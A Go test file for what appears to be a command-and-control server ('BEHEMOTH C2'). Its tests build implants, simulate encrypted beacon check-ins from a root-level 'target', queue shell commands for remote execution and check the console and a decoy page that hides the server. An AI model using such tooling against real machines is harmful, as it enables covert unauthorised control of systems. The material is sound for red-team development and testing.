package c2

import (
	"encoding/base64"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strconv"
	"strings"
	"testing"
)

func newTestMux(t *testing.T) (*Manager, http.Handler) {
	t.Helper()
	m := newTestManager(t)
	mux := http.NewServeMux()
	RegisterHandler(mux, &Handler{M: m})
	RegisterConsole(mux, &Console{M: m})
	return m, mux
}

// post sends an encoded payload to the handler the way an implant would.
func post(t *testing.T, mux http.Handler, path, token, enc, iv string, v any) *httptest.ResponseRecorder {
	t.Helper()
	plain, err := json.Marshal(v)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	body := []byte(base64.StdEncoding.EncodeToString(plain))
	ivHeader := ""
	if enc == encAES {
		var hdrs map[string]string
		body, hdrs, err = encodePayload(encAES, token, v)
		if err != nil {
			t.Fatalf("encode: %v", err)
		}
		ivHeader = hdrs[hdrIV]
	}
	req := httptest.NewRequest(http.MethodPost, prefix+path, strings.NewReader(string(body)))
	req.Header.Set(hdrSecret, token)
	req.Header.Set(hdrEnc, enc)
	if ivHeader != "" {
		req.Header.Set(hdrIV, ivHeader)
	}
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)
	return rec
}

func TestCheckinResultLoop(t *testing.T) {
	m, mux := newTestMux(t)
	im, err := m.BuildImplant(BuildOpts{})
	if err != nil {
		t.Fatalf("build: %v", err)
	}
	// Idle check-in -> 204.
	rec := post(t, mux, im.BeaconPath, im.Token, encNone, "", Beacon{ID: im.ID, Host: "target-1", User: "root"})
	if rec.Code != http.StatusNoContent {
		t.Fatalf("idle check-in: %d %s", rec.Code, rec.Body.String())
	}
	got, _ := m.Get(im.ID)
	if got.Host != "target-1" || got.User != "root" || got.Status() != "active" {
		t.Fatalf("touch not recorded: %+v", got)
	}
	// No task queued yet.
	if _, ok := m.Dequeue(im.ID); ok {
		t.Fatal("unexpected pending task")
	}
	// Queue a task and check in again.
	task, err := m.AddTask(im.ID, CmdShell, "id", 60)
	if err != nil {
		t.Fatalf("AddTask: %v", err)
	}
	rec = post(t, mux, im.BeaconPath, im.Token, encNone, "", Beacon{ID: im.ID})
	if rec.Code != http.StatusOK {
		t.Fatalf("task check-in: %d", rec.Code)
	}
	if h := rec.Header().Get(hdrTaskID); h == "" {
		t.Fatalf("task id header missing: %v", rec.Header())
	}
	if h := rec.Header().Get(hdrTaskCmd); h != CmdShell {
		t.Fatalf("cmd header: %q", h)
	}
	var out CommandOut
	if err := decodePayload(encNone, "", im.Token, rec.Body.Bytes(), &out); err != nil {
		t.Fatalf("decode task body: %v", err)
	}
	if out.TaskID != strconv.FormatInt(task.ID, 10) || out.Args != "id" {
		t.Fatalf("task payload: %+v", out)
	}
	// Post the result.
	rec = post(t, mux, im.RespPath, im.Token, encNone, "", ResultIn{ID: im.ID, TaskID: out.TaskID, Output: "uid=0(root)", Exit: 0})
	if rec.Code != http.StatusOK {
		t.Fatalf("result post: %d %s", rec.Code, rec.Body.String())
	}
	res := m.Results(im.ID, 5)
	if len(res) != 1 || res[0].Output != "uid=0(root)" || res[0].TaskID != task.ID {
		t.Fatalf("stored results: %+v", res)
	}
}

func TestCheckinAuthRequired(t *testing.T) {
	_, mux := newTestMux(t)
	im := &Implant{BeaconPath: "api/none"}
	req := httptest.NewRequest(http.MethodPost, prefix+im.BeaconPath, strings.NewReader("{}"))
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)
	if rec.Code != http.StatusOK && rec.Code != http.StatusUnauthorized {
		t.Fatalf("unexpected: %d", rec.Code)
	}
	// Unknown profile path returns the decoy, never an auth error.
	rec = post(t, mux, "unknown/path", "bad-token", encNone, "", Beacon{})
	if rec.Code != http.StatusOK || !strings.Contains(rec.Body.String(), "update") {
		t.Fatalf("decoy: %d %s", rec.Code, rec.Body.String())
	}
}

func TestCheckinAESLoop(t *testing.T) {
	m, mux := newTestMux(t)
	im, err := m.BuildImplant(BuildOpts{Encrypt: "aes"})
	if err != nil {
		t.Fatalf("build: %v", err)
	}
	if _, err := m.AddTask(im.ID, CmdShell, "uname -a", 0); err != nil {
		t.Fatalf("AddTask: %v", err)
	}
	rec := post(t, mux, im.BeaconPath, im.Token, encAES, "", Beacon{ID: im.ID, Host: "w1"})
	if rec.Code != http.StatusOK {
		t.Fatalf("aes check-in: %d %s", rec.Code, rec.Body.String())
	}
	if rec.Header().Get(hdrEnc) != encAES {
		t.Fatalf("response enc: %q", rec.Header().Get(hdrEnc))
	}
	var out CommandOut
	if err := decodePayload(encAES, rec.Header().Get(hdrIV), im.Token, rec.Body.Bytes(), &out); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if out.Args != "uname -a" {
		t.Fatalf("task: %+v", out)
	}
	rec = post(t, mux, im.RespPath, im.Token, encAES, "", ResultIn{ID: im.ID, TaskID: out.TaskID, Output: "Linux", Exit: 0})
	if rec.Code != http.StatusOK {
		t.Fatalf("aes result: %d", rec.Code)
	}
	if res := m.Results(im.ID, 5); len(res) != 1 || res[0].Output != "Linux" {
		t.Fatalf("results: %+v", res)
	}
}

func TestConsoleAuthAndQueue(t *testing.T) {
	m, mux := newTestMux(t)
	im, _ := m.BuildImplant(BuildOpts{})
	tok := m.ConsoleToken()

	// Unauthorized.
	req := httptest.NewRequest(http.MethodGet, consolePath+"data", nil)
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)
	if rec.Code != http.StatusUnauthorized {
		t.Fatalf("console data unauth: %d", rec.Code)
	}
	// Authorized data fetch.
	req = httptest.NewRequest(http.MethodGet, consolePath+"data?t="+tok, nil)
	rec = httptest.NewRecorder()
	mux.ServeHTTP(rec, req)
	if rec.Code != http.StatusOK || !strings.Contains(rec.Body.String(), im.ID) {
		t.Fatalf("console data: %d %s", rec.Code, rec.Body.String())
	}
	// Queue via console.
	form := "id=" + im.ID + "&cmd=shell&args=id&t=" + tok
	req = httptest.NewRequest(http.MethodPost, consolePath+"cmd", strings.NewReader(form))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	rec = httptest.NewRecorder()
	mux.ServeHTTP(rec, req)
	if rec.Code != http.StatusOK {
		t.Fatalf("console cmd: %d %s", rec.Code, rec.Body.String())
	}
	if m.PendingCount(im.ID) != 1 {
		t.Fatal("console cmd did not queue a task")
	}
	// Serve the HTML page.
	req = httptest.NewRequest(http.MethodGet, consolePath+"?t="+tok, nil)
	rec = httptest.NewRecorder()
	mux.ServeHTTP(rec, req)
	if rec.Code != http.StatusOK || !strings.Contains(rec.Body.String(), "BEHEMOTH C2") {
		t.Fatalf("console page: %d", rec.Code)
	}
	// README artifact download.
	req = httptest.NewRequest(http.MethodGet, consolePath+"file/"+im.ID+"/README.txt?t="+tok, nil)
	rec = httptest.NewRecorder()
	mux.ServeHTTP(rec, req)
	if rec.Code != http.StatusOK || !strings.Contains(rec.Body.String(), im.ID) {
		t.Fatalf("artifact download: %d", rec.Code)
	}
	// Path traversal blocked.
	req = httptest.NewRequest(http.MethodGet, consolePath+"file/"+im.ID+"/..%2Fstate.jsonl?t="+tok, nil)
	rec = httptest.NewRecorder()
	mux.ServeHTTP(rec, req)
	if rec.Code == http.StatusOK {
		t.Fatalf("traversal served state file: %d", rec.Code)
	}
}
